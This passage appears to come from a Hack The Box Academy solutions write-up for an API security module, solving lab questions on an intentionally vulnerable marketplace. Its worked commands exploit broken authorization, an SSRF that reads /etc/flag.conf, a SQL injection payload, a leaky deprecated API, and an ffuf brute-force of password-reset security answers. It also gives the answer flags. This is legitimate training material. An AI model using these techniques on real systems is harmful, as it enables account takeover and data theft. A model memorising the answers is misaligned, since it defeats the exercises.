{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyMDU3NDE2NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.ZqfcdYYVloQpIeeSRZiXQ9Ehhb10QsV1eIi6otw4fGnac-i8iZEhuV5ll1k2mF_AHCq-sTnNPaLqTlFVcFLXzA"}
```

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

Students now need to check which Roles are available to them, by visiting the `/api/v1/roles/current-user` endpoint and clicking `Execute`:

![[HTB Solutions/Others/z. images/4dbbf0910c6c701381fcaccb47280860_MD5.jpg]]

Having verified that the current user does not have any roles assigned, students need look through all of the available endpoints seen in Swagger, to see which might be susceptible to a `Broken Function Level Authorization` vulnerability.

Upon inspecting the `/api/v1/customers/billing-addresses` endpoint, students will see that it requires the `CustomerBillingAddresses_GetAll` role:

![[HTB Solutions/Others/z. images/b265914b6e0caa27280ea44c7902b0a9_MD5.jpg]]

However, students will find that they are still able to `Execute` the endpoint:

![[HTB Solutions/Others/z. images/c29b9c59676e318c40ea2ab38d403cd6_MD5.jpg]]

To obtain the flag, students need to use the provided `curl` command , piping the output into `jq` for easier viewing, then piping again into `grep` (as typically, flags start with the letters `HTB`):

Code: shell

```shell
curl -s -X 'GET' \
  'http://STMIP:STMPO/api/v1/customers/billing-addresses' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | jq . | grep HTB
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-0uklnw9led]─[~]
└──╼ [★]$ curl -s -X 'GET' \
  'http://94.237.49.212:31020/api/v1/customers/billing-addresses' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjlAaGFja3RoZWJveC5jb20iLCJleHAiOjE3MjExNTU0NTgsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.DdHUK1rpJbLDuXCXcQ04yJdciv1VsL_AyD403kg6DDOJT0NP-DbGxdNe_vMP2LIRFzdaIYWqdH_a5GiQN72fww' | jq . | grep HTB
  
      "street": "HTB{hidden}",
```

Answer: `HTB{1e2095c564baf0d2d316080217040dae}`

# Unrestricted Access to Sensitive Business Flows

## Question 1

### "Based on the previous vulnerability, exploit the Unrestricted Access to Sensitive Business Flow vulnerability and submit the street name where the user with the ID 'daa8c984-ba84-4265-8d88-12d6607e511c' lives."

To begin, students need to obtain a JWT for the `htbpentester9@hackthebox.com` user, then apply the JWT via the `Authorize` button seen on the dashboard of Swagger UI:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}'
```

```
┌─[htb-ac-594497@htb-k12kdh1qwz]─[~]
└──╼ $curl -X 'POST' \
  'http://83.136.252.57:56248/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester9@hackthebox.com",
  "Password": "HTBPentester9"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjdAaGFja3RoZWJveC5jb20iLCJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dzLzIwMDgvMDYvaWRlbnRpdHkvY2xhaW1zL3JvbGUiOlsiQ3VzdG9tZXJPcmRlcnNfR2V0QnlJRCIsIkN1c3RvbWVyT3JkZXJzX0NyZWF0ZSIsIkN1c3RvbWVyT3JkZXJJdGVtc19HZXQiLCJDdXN0b21lck9yZGVySXRlbXNfQ3JlYXRlIl0sImV4cCI6MTcyMDU3NDE2NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.ZqfcdYYVloQpIeeSRZiXQ9Ehhb10QsV1eIi6otw4fGnac-i8iZEhuV5ll1k2mF_AHCq-sTnNPaLqTlFVcFLXzA"}
```

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

Once again, students need to test the various API endpoints and find one which allows execution, despite lacking the required role. Incidentally, the `/api/v1/customers/billing-addresses` endpoint meets this criteria:

![[HTB Solutions/Others/z. images/b598673edad5664eef6f8ca69ea2f203_MD5.jpg]]

![[HTB Solutions/Others/z. images/65846641d3cf682008f544f90917105d_MD5.jpg]]

Having discovered the vulnerable endpoint, students are now able to identify the street name where the user with the ID of `daa8c984-ba84-4265-8d88-12d6607e511c` lives:

Code: shell

```shell
curl -X 'GET' \
  'http://STMIP:STMPO/api/v1/customers/billing-addresses' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | jq '.customersBillingAddresses[] | select(.customerID == "daa8c984-ba84-4265-8d88-12d6607e511c")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-jr5ob5qxya]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.51.8:58088/api/v1/customers/billing-addresses'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjlAaGFja3RoZWJveC5jb20iLCJleHAiOjE3MjExNjEyNjcsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.PJgtu4LWBaHrEbRxF6lev16EfPMxGNi-Y0mR016s6ozTDEz5N6Wd40tgqxMRKWOe79rdJGWcA-5hfe--Iua3ww' | jq '.customersBillingAddresses[] | select(.customerID == "daa8c984-ba84-4265-8d88-12d6607e511c")'

{
  "customerID": "daa8c984-ba84-4265-8d88-12d6607e511c",
  "city": "Glasgow",
  "country": "UK",
  "street": "{hidden}",
  "postalCode": 63103
}
```

Answer: `788 Sauchiehall St.`

# Server Side Request Forgery

## Question 1

### "Exploit another Server Side Request Forgery vulnerability and submit the contents of the file '/etc/flag.conf'."

To begin, students need to obtain a JWT for the `htbpentester11@hackthebox.com` user, then apply the JWT via the `Authorize` button seen on the dashboard of Swagger UI:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester11@pentestercompany.com",
  "Password": "HTBPentester11"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-jr5ob5qxya]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://83.136.251.234:47652/api/v1/authentication/suppliers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester11@pentestercompany.com",
  "Password": "HTBPentester11"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjExQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cHBsaWVyQ29tcGFuaWVzX1VwZGF0ZSIsIlN1cHBsaWVyQ29tcGFuaWVzX1VwbG9hZENlcnRpZmljYXRlT2ZJbmNvcnBvcmF0aW9uIiwiUHJvZHVjdHNfQ3JlYXRlQnlDdXJyZW50VXNlciIsIlByb2R1Y3RzX1VwZGF0ZSIsIlByb2R1Y3RzX1VwbG9hZFBob3RvIl0sImV4cCI6MTcyMTE2Nzg1NCwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.Mp05jFBpZFbG8zMLfESAjXrFUZasUQhG4CLbBGkaEVw8n_Q3U3dZqZAq4DfKA5ppZ1YqIJZrIIrT0FSBcQo8iA"}
```

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

After signing in as a supplier and applying the corresponding JWT, students need to view their roles via the `/api/v1/roles/current-user` endpoint:

Code: shell

```shell
curl -s -X 'GET' \
  'http://STMIP:STMPO/api/v1/roles/current-user' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | jq .
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-jr5ob5qxya]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.53.113:30470/api/v1/roles/current-user'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjExQHBlbnRlc3RlcmNvbXBhbnkuY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlN1cHBsaWVyQ29tcGFuaWVzX1VwZGF0ZSIsIlN1cHBsaWVyQ29tcGFuaWVzX1VwbG9hZENlcnRpZmljYXRlT2ZJbmNvcnBvcmF0aW9uIiwiUHJvZHVjdHNfQ3JlYXRlQnlDdXJyZW50VXNlciIsIlByb2R1Y3RzX1VwZGF0ZSIsIlByb2R1Y3RzX1VwbG9hZFBob3RvIl0sImV4cCI6MTcyMTE2OTUxOSwiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.LQYmZKd4J7B4E_y8CYqoAEMm3BG1KRZm8u8JyRInsVcDpDUIZrM7HZjtZdjbw8tJiCa-tjmwlrYFGWm3tLQFag' | jq .

{
  "roles": [
    "SupplierCompanies_Update",
    "SupplierCompanies_UploadCertificateOfIncorporation",
    "Products_CreateByCurrentUser",
    "Products_Update",
    "Products_UploadPhoto"
  ]
}
```

Students will find that the current user has three additional roles that the `HTBPentester10` user (seen in the section's reading) did not possess:

- `Products_CreateByCurrentUser`
- `Products_Update`
- `Products_UploadPhoto`

Additionally, students need to check the `/api/v1/suppliers/current-user` endpoint, and take note of the Company and Supplier ID's:

![[HTB Solutions/Others/z. images/d244fb4762f042a5291ea96e45c14c00_MD5.jpg]]

```
{
  "supplier": {
    "id": "5d489453-3538-4973-9479-2c37b2a5db73",
    "companyID": "b75a7c76-e149-4ca7-9c55-d9fc4ffa87be",
    "name": "HTBPentester11",
    "email": "htbpentester11@pentestercompany.com",
    "phoneNumber": "+44 9998 999992"
  }
}
```

Students need to create a new product via the POST `/api/v1/products/current-user` endpoint, taking note of the Product Name (in this example, we have used `ballofstring`) and resulting Product ID:

![[HTB Solutions/Others/z. images/710ad0218f85d4a457c12444268943f9_MD5.jpg]]

```
{
  "successStatus": true,
  "productID": "7a3862d2-1953-4383-96db-8559bd3e6bf9"
}
```

Subsequently, students need to invoke the POST `/api/v1/products/photo` endpoint, uploading a .png file of their choosing for the newly created item:

![[HTB Solutions/Others/z. images/5df1cfefd5826629a336c4a03faf2069_MD5.jpg]]

Now, students need to visit the PATCH `api/v1/products` endpoint, filling out the necessary information while setting the `PNGPhotoFileURI` to `file:///etc/flag.conf`:

![[HTB Solutions/Others/z. images/b7e9c1c21d2271efdc3c3f286ec40f8d_MD5.jpg]]

![[HTB Solutions/Others/z. images/1b50d899e5e5827cb1a3acfeaa0afa43_MD5.jpg]]

Finally, students need to invoke the `/api/v1/products/{ID}/photo` endpoint, providing the Product ID before executing:

![[HTB Solutions/Others/z. images/7688a38275674576b9618d616adc24b3_MD5.jpg]]

![[HTB Solutions/Others/z. images/e94525ff3c8dadf22f185e6171cc9d7f_MD5.jpg]]

After decoding the `base64Data` key seen the response, the flag will be revealed:

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-jr5ob5qxya]─[~]
└──╼ [★]$ echo SFRCezNjOTQyMzJjNGYwYjBhNTQ0YWU0MDI0ODMzZWVmMGIzfQo= | base64 -d

HTB{hidden}
```

Answer: `HTB{3c94232c4f0b0a544ae4024833eef0b3}`

# Security Misconfiguration

## Question 1

### "Exploit another Security Misconfiguration and provide the total count of records within the target table."

To begin, students need to obtain a JWT for the `htbpentester13@hackthebox.com` user, then apply the JWT via the `Authorize` button seen on the dashboard of Swagger UI:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester13@hackthebox.com",
  "Password": "HTBPentester13"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-zrx6vffu0v]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://94.237.49.212:36237/api/v1/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester13@hackthebox.com",
  "Password": "HTBPentester13"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlcjEzQGhhY2t0aGVib3guY29tIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwcGxpZXJzX0dldFRvdGFsQ291bnRCeVN1cHBsaWVyTmFtZVN1YnN0cmluZyIsImV4cCI6MTcyMTIzMzAyNywiaXNzIjoiaHR0cDovL2FwaS5pbmxhbmVmcmVpZ2h0Lmh0YiIsImF1ZCI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIifQ.S1nTXttsxT0u8SYJhqj-qs1tHN4wxX7DAMhXY97zReAZD34jkIwuTnMFEE_VjLATgvs45QSDPMNhGd_oabQl3g"}
```

![[HTB Solutions/Others/z. images/4da27fe4f8a998032409196b6c8c31fc_MD5.jpg]]

![[HTB Solutions/Others/z. images/7591b7162aa2a3a74de44b5888a39061_MD5.jpg]]

After authorizing the JWT, students need to visit the GET `/api/v1/suppliers/{Name}/count` endpoint. Here, students will find that the `Description` input box is susceptible to error-based SQL injection:

```
' or '1'='1
```

![[HTB Solutions/Others/z. images/9262715db6aa8ef796b9b2fd2f8b617f_MD5.jpg]]

After passing a SQL query that evaluates to true, students will find the API responds with the total number of records in the table.

Answer: `151`

# Security Misconfiguration

## Question 2

### "Submit the header and its value that expose another Security Misconfiguration in the API."

Students need to explore the API and test the available endpoints, examining the headers seen in the responses.

Upon examining any POST endpoint, such as `/api/v1/authentication/customers/passwords/resets/sms-otps`, students will find the API does not set a secure [Access-Control-Allow-Origin](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html#access-control-allow-origin) policy:

![[HTB Solutions/Others/z. images/65b04e43cbe41875acbf5a950bc236bc_MD5.jpg]]

![[HTB Solutions/Others/z. images/164c93ceb5dc0c3ea0d65da282830424_MD5.jpg]]

Answer: `access-control-allow-origin: *`

# Improper Inventory Management

## Question 1

### "Exploit the Improper Inventory Management vulnerability and submit the value of the 'Email' field from the deleted Supplier Company with the ID 'c250cb38-96e3-4ccf-9df2-0a03146a2d0b'."

Students need to use their browser to visit `http://STMIP:STMPO/swagger`, bringing up the dashboard for the API. Then, students need to use the `Select a definition` drop-down menu and select `v0`:

![[HTB Solutions/Others/z. images/84e7be127af2e9909c2bf035c8e5929e_MD5.jpg]]

Once `v0` of the API has been chosen, students need to click the **API** drop down menu to view the available endpoints:

![[HTB Solutions/Others/z. images/96bf710927823c6885041ab50d45249a_MD5.jpg]]

Students need to invoke the `/api/v0/supplier-companies/deleted` endpoint, specifying the Supplier Company with the ID `c250cb38-96e3-4ccf-9df2-0a03146a2d0b`:

Code: shell

```shell
curl -s -X 'GET' 'http://STMIP:STMPO/api/v0/supplier-companies/deleted' \
  -H 'accept: application/json' | \
  jq '.[] | select(.ID == "c250cb38-96e3-4ccf-9df2-0a03146a2d0b")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ curl -s -X 'GET' 'http://83.136.252.242:33361/api/v0/supplier-companies/deleted' \
  -H 'accept: application/json' | \
  jq '.[] | select(.ID == "c250cb38-96e3-4ccf-9df2-0a03146a2d0b")'

{
  "ID": "c250cb38-96e3-4ccf-9df2-0a03146a2d0b",
  "Name": "Hack The Box",
  "Email": "HTB{hidden}",
  "IsExemptedFromMarketplaceFee": 1,
  "CertificateOfIncorporationPDFFileURI": "CompanyDidNotUploadYet"
}
```

Answer: `HTB{43c2754afea99eba70fb2c8dc443c660}`

# Unsafe Consumption of APIs

## Question 1

### "If v1 of Inlanefreight's E-Commerce Marketplace accepted data from the '/api/v0/suppliers/deleted' endpoint unsafely, what would the password hash of 'Yara MacDonald' be in v1?"

Students need to invoke the `/api/v0/suppliers/deleted` endpoint, specifying the supplier with the name `Yara MacDonald`:

Code: shell

```shell
curl -s -X 'GET'   'http://STMIP:STMPO/api/v0/suppliers/deleted'   -H 'accept: application/json' | jq '.[] | select(.Name == "Yara MacDonald")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://83.136.252.242:33361/api/v0/suppliers/deleted'   -H 'accept: application/json' | jq '.[] | select(.Name == "Yara MacDonald")'

{
  "ID": "c687e876-ee3e-4490-b5b6-e2e5b497ce2a",
  "CompanyID": "bf7c7d0d-a5a1-40c1-a49b-7c499aca35f7",
  "Name": "Yara MacDonald",
  "Email": "Y.MacDonald1406@cyberneticsolutions.com",
  "PhoneNumber": "(210) 263-2635",
  "PasswordHash": "hidden"
}
```

Answer: `006006C3167E90A7575A12E474218D86`

# Skills Assessment

## Question 1

### "Submit the contents of the flag at '/flag.txt'."

To begin, students need to use the `/api/v2/authentication/customers/sign-in` endpoint, signing in with the credentials `htbpentester@hackthebox.com:HTBPentester`:

Code: shell

```shell
curl -X 'POST' \
  'http://STMIP:STMPO/api/v2/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester@hackthebox.com",
  "Password": "HTBPentester"
}'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ curl -X 'POST' \
  'http://94.237.58.3:45079/api/v2/authentication/customers/sign-in' \
  -H 'accept: application/json' \
  -H 'Content-Type: application/json' \
  -d '{
  "Email": "htbpentester@hackthebox.com",
  "Password": "HTBPentester"
}'

{"jwt":"eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3MjEzMjA3MjUsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.LHqioo8exsvYtkmeKOsFQo7wVQAiLBnJwI9Gs26yeNyYOgRWIj15pJLJEKM36rE_qsJOPS9C9pil0Q_VG87yiA"}
```

Then, students need to `Authorize` with the JWT that was returned by the initial command:

![[HTB Solutions/Others/z. images/4c9fb1baa3583d6e352bea7a00c972f0_MD5.jpg]]

![[HTB Solutions/Others/z. images/dc1dc2228ffbff5604e1a1b8a10954b5_MD5.jpg]]

Next, students need to enumerate which Roles are available to them, utilizing the `/api/v2/roles/current-user` endpoint to discover they have only two roles: `Suppliers_Get` and `Suppliers_GetAll`:

![[HTB Solutions/Others/z. images/ae6d650e1682ce7e7e572a2667492fa6_MD5.jpg]]

Given these roles, students now need to enumerate Suppliers. Using the GET `/api/v2/suppliers endpoint` to get the records of all Suppliers, students will see they have a field named `securityQuestion`:

![[HTB Solutions/Others/z. images/c7cb632ccbf1756af9f94cf628bbefbe_MD5.jpg]]

Students need to find which Suppliers have an actual Security Question set:

Code: shell

```shell
curl -s -X 'GET' 'http://STMIP:STMPO/api/v2/suppliers' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWT>' | \
  jq '.suppliers[] | select(.securityQuestion != "SupplierDidNotProvideYet")'
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ curl -s -X 'GET'   'http://94.237.58.3:45079/api/v2/suppliers'   -H 'accept: application/json'   -H 'Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6Imh0YnBlbnRlc3RlckBoYWNrdGhlYm94LmNvbSIsImh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd3MvMjAwOC8wNi9pZGVudGl0eS9jbGFpbXMvcm9sZSI6WyJTdXBwbGllcnNfR2V0IiwiU3VwcGxpZXJzX0dldEFsbCJdLCJleHAiOjE3MjEzMjA5NTYsImlzcyI6Imh0dHA6Ly9hcGkuaW5sYW5lZnJlaWdodC5odGIiLCJhdWQiOiJodHRwOi8vYXBpLmlubGFuZWZyZWlnaHQuaHRiIn0.sidDOFs5Wva7Zg_NAHwICQin9q7lBtt3In5j_lAzGXp7-F78VLmq29rPUo6IY9E9NP_akQ0oi78YAsYiL4tZOg' | jq '.suppliers[] | select(.securityQuestion != "SupplierDidNotProvideYet")'

{
  "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Patrick Howard",
  "email": "P.Howard1536@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Luca Walker",
  "email": "L.Walker1872@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "fafebea0-8894-4744-b7de-6c66d5749740",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Tucker Harris",
  "email": "T.Harris1814@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "36f17195-395f-443e-93a4-8ceee81c6106",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Brandon Rogers",
  "email": "B.Rogers1535@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
{
  "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
  "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
  "name": "Mason Alexander",
  "email": "M.Alexander1650@globalsolutions.com",
  "securityQuestion": "What is your favorite color?",
  "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
}
```

Having found five suppliers with the security question `"What is your favorite color?"`, students now need to try and reset their passwords, examining the POST `/api/v2/authentication/suppliers/passwords/resets/security-question-answers` endpoint:

![[HTB Solutions/Others/z. images/a4da030d4d3bf8d78e6be4f0d544c785_MD5.jpg]]

Students will find the endpoint requires a supplier email, the answer to their security question, and the new password. Therefore, in order to bruteforce, students need to first make a wordlist containing the email addresses of the five suppliers:

Code: shell

```shell
cat << EOF > supplierEmails.txt
P.Howard1536@globalsolutions.com
L.Walker1872@globalsolutions.com
T.Harris1814@globalsolutions.com
B.Rogers1535@globalsolutions.com
M.Alexander1650@globalsolutions.com
EOF
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ cat << EOF > supplierEmails.txt

> P.Howard1536@globalsolutions.com
> L.Walker1872@globalsolutions.com
> T.Harris1814@globalsolutions.com
> B.Rogers1535@globalsolutions.com
> M.Alexander1650@globalsolutions.com
> EOF
```

Students will also need a [wordlist containing colors](https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt):

Code: shell

```shell
wget https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ wget https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt

--2024-07-18 12:22:42--  https://gist.githubusercontent.com/mordka/c65affdefccb7264efff77b836b5e717/raw/e65646a07849665b28a7ee641e5846a1a6a4a758/colors-list.txt
Resolving gist.githubusercontent.com (gist.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.108.133, ...
Connecting to gist.githubusercontent.com (gist.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1503 (1.5K) [text/plain]
Saving to: ‘colors-list.txt’

colors-list.txt       100%[=======================>]   1.47K  --.-KB/s    in 0s      

2024-07-18 12:22:43 (7.34 MB/s) - ‘colors-list.txt’ saved [1503/1503]
```

Using these two wordlists, students need to use `FFuF` to bruteforce the password reset endpoint. In the example shown below, we will use `Password123!` as the new password to set:

Code: shell

```shell
ffuf -w colors-list.txt:ANSWER -w supplierEmails.txt:EMAIL -u http://STMIP:STMPO/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}' -fs 23
```

```
┌─[us-academy-4]─[10.10.15.43]─[htb-ac-594497@htb-cgw2yb6cuq]─[~]
└──╼ [★]$ ffuf -w colors-list.txt:ANSWER -w supplierEmails.txt:EMAIL -u http://83.136.250.98:55651/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H "Content-Type: application/json" -H "accept: application/json" -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "ANSWER", "NewPassword": "Password123!"}' -fs 23

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://83.136.250.98:55651/api/v2/authentication/suppliers/passwords/resets/security-question-answers
